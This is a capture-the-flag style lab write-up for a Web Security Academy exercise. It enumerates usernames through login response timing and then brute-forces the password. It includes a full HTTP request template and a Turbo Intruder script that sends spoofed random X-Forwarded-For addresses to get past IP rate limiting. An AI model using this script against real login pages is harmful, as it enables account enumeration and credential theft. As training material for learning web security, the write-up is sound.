---
title: Username enumeration via response timing
category: Authentication
difficulty: Practitioner
tags:
  - authentication-failures
  - brute-force
---
The goal of this lab is to enumerate valid usernames by measuring response times. To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be possibly bypassed by manipulating HTTP request headers.

Given the hint about HTTP headers, my first idea was to make each request appear unique by modifying the `User-Agent` header value. I considered appending the username and/or password to the end of `User-Agent`, but that turned out not to be viable, since the site is protected by Cloudflare, which rejects malformed `User-Agent` values. 

A better choice is `X-Forwarded-For`, where we can insert a random IP address for each request in the hope of bypassing the brute-force protection.

The request skeleton, with placeholders for IP, username, and password, looks like this:
```http
POST /login HTTP/2
Host: 0ade(...)9800ed.web-security-academy.net
Cookie: session=cR8o5(...)c5GO
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0ade(...)9800ed.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ade(...)9800ed.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Forwarded-For: %s

username=%s%&password=%s
```

The Turbo Intruder script fills out the placeholders `%s` in the order they appear. The password must be quite long for the timing difference to be noticeable, otherwise the difference in timing will not be visible.
```python
import random

def randomIP():
    return ".".join(map(str, (random.randint(0,255) for _ in range(4))))

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=10,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    long_password = "A" * 2000


    for word in open('/home/kali/Downloads/PS-WSA-usernames.txt'):

        engine.queue(target.req, [randomIP(), word.rstrip(), long_password])


def handleResponse(req, interesting):
    table.add(req)
```

After Turbo Intruder is done, it's a simple matter of sorting by the response time. One entry has an absurdly long response time (in this case `arkansas`) - so we now know the username.

The password can then be found using the same approach, but with a fixed username and a password wordlist. It is important to keep the random IP in `X-Forwarded-For`, otherwise the brute-force protection will make it impossible to find the correct password.

The password found was `montana`. However, since the IP was banned by the brute-force filter earlier, it was not possible to log in with a browser. We need to send the login request using Repeater with correct credentials, a random IP in `X-Forwarded-For` and **enabled cookie handling** to solve the lab.